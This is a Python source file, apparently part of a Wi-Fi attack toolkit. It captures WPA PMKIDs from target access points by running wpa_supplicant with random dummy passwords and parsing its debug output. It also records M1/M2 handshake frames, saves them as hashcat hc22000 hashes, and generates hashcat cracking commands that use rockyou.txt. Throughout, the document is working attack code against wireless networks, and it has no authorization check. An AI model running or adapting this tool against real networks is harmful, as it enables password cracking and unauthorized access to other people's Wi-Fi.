#!/usr/bin/env python3
"""
WPA Handshake Capture v7
- Extract PMKID both from wpa_supplicant debug lines and the M1 PMKID KDE
- ANonce from M1
- SNonce + MIC + EAPOL frame from the same diagnostic M2
- Managed-mode capture for drivers without monitor mode
"""

import os, re, json, time, subprocess, tempfile, shutil, random, string, struct
from pathlib import Path
from datetime import datetime

CAPTURE_DIR = Path(__file__).parent.parent / "data" / "handshakes"
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)


def _get_interface_mac(iface):
    try:
        r = subprocess.run(["ip", "link", "show", iface],
                          capture_output=True, text=True, timeout=5)
        m = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", r.stdout)
        if m:
            return m.group(1).upper()
    except Exception:
        pass
    return None


def _random_psk():
    formats = [
        lambda: "M" + str(random.randint(10000000, 99999999)),
        lambda: "W" + str(random.randint(100000000, 999999999)),
        lambda: "H" + str(random.randint(10000000, 99999999)) + "K",
        lambda: "N" + "".join(random.choices(string.ascii_lowercase, k=4)) + str(random.randint(1000, 9999)),
        lambda: "T" + str(random.randint(100000000, 999999999)),
        lambda: "P" + str(random.randint(10000000, 99999999)) + "Z",
        lambda: "X" + "".join(random.choices(string.digits, k=9)),
        lambda: "A" + str(random.randint(10000000, 99999999)) + "B",
    ]
    return random.choice(formats)()


class HandshakeCapture:
    def __init__(self, interface):
        self.interface = interface
        self.captured = {
            "pmkid": None,
            "anonce": None,
            "snonce": None,
            "mic": None,
            "eapol_m1": None,
            "eapol_m2": None,
            "auth_mac": None,
            "supp_mac": None,
            "ssid": None,
            "eapol_frames": [],
        }
        self.output = []
        self.callback = None
        self._ap_bssid = None
        self._pmkid_only = False
        self._diagnostic_only = False

    def _log(self, msg):
        self.output.append(msg)
        if self.callback:
            self.callback(msg)

    def _extract_hex(self, line):
        m = re.search(r"hexdump\(len=(\d+)\):\s*([0-9a-fA-F ]+)", line)
        if m: return int(m.group(1)), m.group(2).replace(" ", "").upper()
        m = re.search(r"hexdump\[(\d+)\]:\s*([0-9a-fA-F ]+)", line)
        if m: return int(m.group(1)), m.group(2).replace(" ", "").upper()
        m = re.search(r"hexdump\[(\d+)\]:([0-9a-fA-F]{8,})", line)
        if m: return int(m.group(1)), m.group(2).upper()
        m = re.search(r":\s*((?:[0-9a-fA-F]{2}\s*){16,})", line)
        if m:
            hex_data = m.group(1).replace(" ", "").upper()
            return len(hex_data) // 2, hex_data
        return None, None

    def _extract_mac(self, line):
        m = re.search(r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", line)
        if m: return m.group(1).upper()
        return None

    def _is_valid_mic(self, hex_str):
        if not hex_str or len(hex_str) != 32: return False
        if hex_str == "0" * 32 or hex_str == "F" * 32: return False
        return len(set(hex_str[:8])) > 1

    def _extract_mic_from_frame(self, frame_hex):
        """استخراج MIC من إطار EAPOL-Key كامل (بما في ذلك EAPOL header 4 بايت)"""
        if len(frame_hex) < 194:
            return None
        # MIC في bytes 81-96 (hex 162-194)
        mic = frame_hex[162:194].upper()
        if self._is_valid_mic(mic):
            return mic
        return None

    def _extract_nonce_from_frame(self, frame_hex):
        """استخراج Nonce من إطار EAPOL-Key (bytes 17-48 = hex 34-98)"""
        if len(frame_hex) < 98:
            return None
        nonce = frame_hex[34:98]
        if nonce and len(nonce) >= 64 and nonce != "0" * 64:
            return nonce[:64]
        return None

    def _store_pmkid(self, pmkid, source):
        """Validate and store one PMKID without duplicate log messages."""
        value = (pmkid or "").replace(" ", "").upper()
        if not self._is_valid_mic(value) or self.captured["pmkid"]:
            return False
        self.captured["pmkid"] = value
        self._log("[+] PMKID ({source}): {value}".format(
            source=source, value=value
        ))
        return True

    def _extract_pmkid_from_frame(self, frame_hex):
        """Extract the standard PMKID KDE: DD 14 00 0F AC 04 + 16 bytes."""
        try:
            frame = bytes.fromhex(frame_hex)
        except (TypeError, ValueError):
            return None

        signature = b"\xdd\x14\x00\x0f\xac\x04"
        start = 0
        while True:
            pos = frame.find(signature, start)
            if pos < 0:
                return None
            pmkid_start = pos + len(signature)
            pmkid_end = pmkid_start + 16
            if pmkid_end <= len(frame):
                pmkid = frame[pmkid_start:pmkid_end].hex().upper()
                if self._is_valid_mic(pmkid):
                    return pmkid
            start = pos + 1

    def _parse_line(self, line):
        ll = line.lower()

        # ═══ PMKID from explicit wpa_supplicant debug output ═══
        if "pmkid" in ll:
            pmkid = None
            hlen, hdata = self._extract_hex(line)
            if hlen and hdata:
                if hlen == 16 and len(hdata) >= 32:
                    pmkid = hdata[:32]
                elif hlen == 22 and len(hdata) >= 44:
                    pmkid = hdata[12:44]
                elif hlen >= 16:
                    clean = re.sub(r"[^0-9A-F]", "", hdata.upper())
                    if len(clean) >= 32:
                        pmkid = clean[:32]

            # Some builds print "PMKID=<32 hex>" without a hexdump marker.
            if not pmkid:
                tail = line[ll.find("pmkid") + 5:]
                match = re.search(
                    r"(?<![0-9a-fA-F])([0-9a-fA-F]{32})(?![0-9a-fA-F])",
                    tail,
                )
                if match:
                    pmkid = match.group(1)

            if pmkid:
                self._store_pmkid(pmkid, "wpa_supplicant")

        # ═══ MIC (من wpa_supplicant) ═══ (أخذه فقط إذا ما عندنا M2)
        if re.search(r"key\s+mic", ll) and "hexdump" in ll:
            hlen, hdata = self._extract_hex(line)
            if hlen == 16 and hdata and len(hdata) >= 32:
                mic = hdata[:32].upper()
                if self._is_valid_mic(mic) and not self.captured["eapol_m2"]:
                    self.captured["mic"] = mic

        # ═══ EAPOL-Key Frames ═══
        if "EAPOL" in line and "Key" in line:
            hlen, hdata = self._extract_hex(line)
            if hdata and len(hdata) >= 96:
                self.captured["eapol_frames"].append(hdata)

                # Some wpa_supplicant builds do not print a separate PMKID line.
                # In that case, extract the PMKID KDE directly from M1 key data.
                frame_pmkid = self._extract_pmkid_from_frame(hdata)
                if frame_pmkid:
                    self._store_pmkid(frame_pmkid, "M1 KDE")

                # حلل Key Info
                if len(hdata) >= 14:
                    try:
                        ki_bytes = bytes.fromhex(hdata[10:14])
                        ki = struct.unpack(">H", ki_bytes)[0]
                        ack = bool(ki & 0x0080)
                        mic_flag = bool(ki & 0x0100)
                    except (ValueError, struct.error):
                        pass

                    # M1: Ack=1, MIC=0 → ANonce من الراوتر
                    if ack and not mic_flag and not self.captured["anonce"]:
                        nonce = self._extract_nonce_from_frame(hdata)
                        if nonce:
                            self.captured["anonce"] = nonce
                            self.captured["eapol_m1"] = hdata
                            self._log("[+] M1 captured (ANonce)")

                    # إطار فيه MIC: ممكن M2 أو M3 أو M4
                    if mic_flag:
                        nonce = self._extract_nonce_from_frame(hdata)
                        mic_in_frame = self._extract_mic_from_frame(hdata)

                        if mic_in_frame:
                            # تحقق إذا nonce عشوائي (M2) أو لا (M4)
                            is_m2 = False
                            if nonce and len(nonce) >= 16 and nonce != "0" * 64:
                                zeros = 0
                                for c in nonce:
                                    if c == '0': zeros += 1
                                    else: break
                                is_m2 = zeros <= 4

                            # الأولوية 1: عندنا MIC من WPA:Key MIC والإطار يطابقه
                            if self.captured["mic"] and mic_in_frame == self.captured["mic"]:
                                if is_m2:
                                    self.captured["snonce"] = nonce
                                    self.captured["eapol_m2"] = hdata
                                    self._log("[+] M2 matched with MIC from WPA:Key MIC")
                                elif not self.captured["eapol_m2"]:
                                    self.captured["eapol_mic_frame"] = hdata

                            # الأولوية 2: M2 من الإطار مباشرة
                            elif is_m2 and not self.captured["eapol_m2"]:
                                self.captured["mic"] = mic_in_frame
                                self.captured["snonce"] = nonce
                                self.captured["eapol_m2"] = hdata
                                self._log("[+] M2 from frame (MIC+SNonce)")

        # ═══ باقي الأشياء ═══
        if "from authenticator" in ll:
            mac = self._extract_mac(line)
            if mac: self.captured["auth_mac"] = mac

        if "authenticator mac" in ll or "aa mac" in ll:
            mac = self._extract_mac(line)
            if mac: self.captured["auth_mac"] = mac

        if "supplicant mac" in ll or "spa mac" in ll:
            mac = self._extract_mac(line)
            if mac:
                self.captured["supp_mac"] = mac
                if mac != "000000000000":
                    self._log("[+] Supplicant MAC: " + mac)

        if "ssid:" in ll and not self.captured["ssid"]:
            m = re.search(r"SSID:\s+(.+)", line)
            if m:
                raw = m.group(1).strip().strip('"')
                if raw: self.captured["ssid"] = raw

    # ═══════════════════════════════════════════
    # تشغيل wpa_supplicant
    # ═══════════════════════════════════════════

    def _create_conf(self, tmpdir, essid, bssid, psk):
        conf = os.path.join(tmpdir, "wpa.conf")
        with open(conf, "w") as f:
            f.write("ctrl_interface=" + tmpdir + "\n")
            f.write("ctrl_interface_group=root\n")
            f.write("network={\n")
            f.write('    ssid="' + essid + '"\n')
            f.write("    bssid=" + bssid + "\n")
            f.write('    psk="' + psk + '"\n')
            f.write("    key_mgmt=WPA-PSK\n")
            f.write("    scan_ssid=1\n")
            f.write("}\n")
        return conf

    def _run_wpas(self, conf, debug_level=3, timeout=25, require_pmkid=False):
        debug_flag = "-" + "d" * debug_level
        cmd = ["wpa_supplicant", debug_flag, "-Dnl80211,wext",
               "-i" + self.interface, "-c" + conf]

        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1)
        except FileNotFoundError:
            return None, "wpa_supplicant not found"
        except Exception as e:
            return None, str(e)

        start = time.time()
        try:
            for line in iter(proc.stdout.readline, ""):
                line = line.rstrip("\n")
                self._parse_line(line)

                if self.captured["pmkid"]:
                    self._log("[+] PMKID captured!")
                    break

                if require_pmkid:
                    pass  # ينتظر PMKID أو timeout
                else:
                    # Full handshake: ننتظر ANonce من M1 و M2 كامل
                    if self.captured["anonce"] and self.captured["eapol_m2"]:
                        self._log("[+] Full handshake captured! M1+M2 مع MIC و SNonce")
                        break

                if time.time() - start > timeout:
                    self._log("[!] Timeout")
                    break
        except KeyboardInterrupt:
            self._log("[!] Interrupted")
        finally:
            self._stop_proc(proc)
        return proc, None

    def _stop_proc(self, proc):
        if not proc: return
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            try:
                proc.kill()
                proc.wait(timeout=3)
            except Exception:
                pass

    # ═══════════════════════════════════════════
    # الطرق الرئيسية
    # ═══════════════════════════════════════════

    def capture_pmkid(self, bssid, essid, timeout=20, retries=2):
        """Capture PMKID only - لا يحفظ Full Handshake"""
        self._pmkid_only = True
        self._diagnostic_only = False
        for attempt in range(1, retries + 2):
            dummy_psk = _random_psk()
            self._log("PMKID capture: " + essid + " attempt " + str(attempt))
            self._log("[*] Dummy PSK for testing: " + dummy_psk)
            self._reset()

            iface_mac = _get_interface_mac(self.interface)
            if iface_mac: self.captured["supp_mac"] = iface_mac

            tmpdir = tempfile.mkdtemp(prefix="pmkid_")
            conf = self._create_conf(tmpdir, essid, bssid, dummy_psk)
            self._run_wpas(conf, debug_level=3, timeout=timeout, require_pmkid=True)
            shutil.rmtree(tmpdir, ignore_errors=True)

            if self.captured["pmkid"]:
                self._log("[+] PMKID captured!")
                break
            elif attempt < retries + 1:
                time.sleep(3 * attempt)

        return self._save(bssid, essid)

    def capture_via_connect(self, bssid, essid, timeout=30, retries=1):
        """Collect a dummy-PSK M1/M2 exchange for parser diagnostics only."""
        self._pmkid_only = False
        self._diagnostic_only = True
        for attempt in range(1, retries + 2):
            wrong_psk = _random_psk()
            self._log("Handshake capture: " + essid + " attempt " + str(attempt))
            self._log("[*] Dummy PSK for testing: " + wrong_psk)
            self._reset()

            iface_mac = _get_interface_mac(self.interface)
            if iface_mac: self.captured["supp_mac"] = iface_mac

            tmpdir = tempfile.mkdtemp(prefix="hs_")
            conf = self._create_conf(tmpdir, essid, bssid, wrong_psk)
            self._run_wpas(conf, debug_level=2, timeout=timeout)
            shutil.rmtree(tmpdir, ignore_errors=True)

            self._analyze()

            if self.captured["pmkid"] or (self.captured["anonce"] and self.captured["eapol_m2"]):
                break
            elif attempt < retries + 1:
                time.sleep(3 * attempt)

        return self._save(bssid, essid)

    def _reset(self):
        for k in list(self.captured.keys()):
            if k == "eapol_frames":
                self.captured[k] = []
            else:
                self.captured[k] = None

    def _analyze(self):
        h = self.captured
        self._log("")
        self._log("=" * 50)
        self._log("CAPTURE ANALYSIS")
        self._log("=" * 50)
        self._log("PMKID:  " + ("FOUND" if h["pmkid"] else "missing"))
        self._log("M1:     " + ("FOUND" if h["eapol_m1"] else "missing"))
        self._log("M2:     " + ("FOUND" if h["eapol_m2"] else "missing"))
        self._log("ANonce: " + ("FOUND" if h["anonce"] else "missing"))
        self._log("SNonce: " + ("FOUND" if h["snonce"] else "missing"))
        self._log("MIC:    " + ("FOUND" if h["mic"] else "missing"))
        if h["pmkid"]:
            self._log("[+] PMKID: Crackable!")
        if h["anonce"] and h["eapol_m2"]:
            self._log("[+] Complete handshake data with M2 frame (EAPOL)")
        self._log("=" * 50)

    def _save(self, bssid, essid):
        h = self.captured
        result = {
            "status": "failed", "pmkid": h["pmkid"],
            "anonce": h["anonce"], "snonce": h["snonce"],
            "mic": h["mic"], "num_frames": len(h["eapol_frames"]),
            "files": [], "output": "\n".join(self.output[-50:]),
        }

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        sb = bssid.replace(":", "").upper()

        # PMKID
        if h["pmkid"]:
            pmkid = h["pmkid"]
            aa = sb
            essid_hex = essid.encode().hex()
            sta = (h.get("supp_mac") or "000000000000").replace(":", "").replace("-", "")
            if len(sta) < 12: sta = "000000000000"

            hc_line = "PMKID:{pmkid}*{aa}*{sta}*{essid_hex}".format(
                pmkid=pmkid, aa=aa, sta=sta, essid_hex=essid_hex)

            fname = CAPTURE_DIR / "pmkid_{sb}_{ts}.hc22000".format(sb=sb, ts=ts)
            with open(fname, "w") as f:
                f.write(hc_line + "\n")
            result["files"].append(str(fname))
            result["status"] = "pmkid_captured"

        # M2 created by this process uses our random dummy PSK. It is useful
        # for parser diagnostics, but cracking it would recover only that dummy.
        if self._pmkid_only and not h.get("pmkid"):
            self._log("[!] No PMKID was exposed by this AP")
        elif self._diagnostic_only and h.get("eapol_m2") and h.get("anonce"):
            if result["status"] != "pmkid_captured":
                result["status"] = "diagnostic_captured"
            self._log("[i] M1/M2 diagnostic captured; no crackable file was created")
            self._log("[i] This M2 is signed with the generated dummy PSK, not the AP key")
        elif h.get("eapol_m2") and h.get("anonce"):
            # MIC من إطار M2 (نفس المصدر)
            mic = h["mic"] or ""
            eapol = h["eapol_m2"]
            sta = (h.get("supp_mac") or "000000000000").replace(":", "")
            essid_hex = essid.encode().hex()

            # SNonce من إطار M2 أو من السطر
            snonce = h["snonce"] or ""
            anonce = h["anonce"] or ""

            if mic and self._is_valid_mic(mic) and snonce and anonce:
                hc = "WPA*02*{mic}*{sb}*{sta}*{essid_hex}*{anonce}*{snonce}*{eapol}".format(
                    mic=mic, sb=sb, sta=sta, essid_hex=essid_hex,
                    anonce=anonce, snonce=snonce, eapol=eapol)

                fname = CAPTURE_DIR / "hs_{sb}_{ts}.hc22000".format(sb=sb, ts=ts)
                with open(fname, "w") as f:
                    f.write(hc + "\n")
                result["files"].append(str(fname))
                if result["status"] != "pmkid_captured":
                    result["status"] = "handshake_captured"
                self._log("[+] Full handshake saved (M2 frame + MIC consistent)!")
            else:
                self._log("[!] Cannot save: MIC or nonces incomplete")

        # Raw JSON
        raw = CAPTURE_DIR / "raw_{sb}_{ts}.json".format(sb=sb, ts=ts)
        with open(raw, "w") as f:
            json.dump({
                "bssid": bssid, "essid": essid, "ts": ts,
                "pmkid": h["pmkid"], "anonce": h["anonce"],
                "snonce": h["snonce"], "mic": h["mic"],
                "auth_mac": h["auth_mac"], "supp_mac": h["supp_mac"],
                "m2_found": bool(h["eapol_m2"]),
                "diagnostic_only": self._diagnostic_only,
                "frames": len(h["eapol_frames"]),
            }, f, indent=2)
        result["files"].append(str(raw))

        logf = CAPTURE_DIR / "log_{sb}_{ts}.log".format(sb=sb, ts=ts)
        with open(logf, "w") as f:
            f.write("\n".join(self.output))
        result["files"].append(str(logf))

        return result


class HandshakeAnalyzer:
    @staticmethod
    def analyze_file(filepath):
        fp = Path(filepath)
        if not fp.exists():
            return {"error": "File not found"}
        r = {"file": str(fp), "format": "", "type": "",
             "bssid": "", "crackable": False, "suggestions": []}

        with open(fp) as f:
            content = f.read().strip()

        if content.startswith("PMKID:"):
            r["format"] = "hc22000"
            r["type"] = "PMKID"
            r["crackable"] = True
            r["suggestions"].append("hashcat -m 22000 {fname} wordlist.txt".format(fname=fp))
            parts = content.split("*")
            if len(parts) >= 2:
                b = parts[1]
                r["bssid"] = ":".join(b[i:i+2] for i in range(0, 12, 2))

        elif content.startswith("WPA*"):
            first_line = content.splitlines()[0].strip()
            parts = first_line.split("*")
            r["format"] = "hc22000"

            if len(parts) >= 6 and parts[1] == "01":
                r["type"] = "PMKID"
                r["crackable"] = len(parts[2]) == 32
            elif len(parts) >= 9 and parts[1] == "02":
                r["type"] = "Real Handshake"
                # Standard hc22000 stores EAPOL in field 7 and message-pair
                # flags in field 8. Old toolkit diagnostics stored EAPOL in 8.
                standard_eapol = parts[7]
                is_standard = len(standard_eapol) >= 190 and len(parts[8]) <= 2
                r["crackable"] = is_standard
                if is_standard:
                    try:
                        pair_value = int(parts[8], 16) & 0x07
                    except ValueError:
                        pair_value = 0
                    r["authorized"] = pair_value != 0
                else:
                    r["type"] = "Legacy Diagnostic"
                    r["suggestions"].append("Not a standard authorized hc22000 pair")

            if len(parts) >= 4 and len(parts[3]) == 12:
                mac_ap = parts[3].upper()
                r["bssid"] = ":".join(
                    mac_ap[index:index + 2] for index in range(0, 12, 2)
                )

            if r["crackable"]:
                r["suggestions"].append(
                    "hashcat -m 22000 {fname} wordlist.txt".format(fname=fp)
                )
            elif not r["suggestions"]:
                r["suggestions"].append("No valid standard PMKID/EAPOL hash")
        elif fp.suffix == ".json":
            r["format"] = "json"
            r["type"] = "Raw"
        return r

    @staticmethod
    def list_captures():
        caps = []
        for f in sorted(CAPTURE_DIR.glob("*"), key=os.path.getmtime, reverse=True):
            if f.suffix in (".hc22000", ".json", ".txt", ".log"):
                a = HandshakeAnalyzer.analyze_file(str(f))
                a["size"] = f.stat().st_size
                a["modified"] = datetime.fromtimestamp(
                    f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
                caps.append(a)
        return caps

    @staticmethod
    def get_crack_cmd(filepath, wordlist=None):
        a = HandshakeAnalyzer.analyze_file(filepath)
        if not a.get("crackable"):
            return None
        wl = wordlist or "/usr/share/wordlists/rockyou.txt"
        return "hashcat -m 22000 {fname} {wl}".format(fname=filepath, wl=wl)
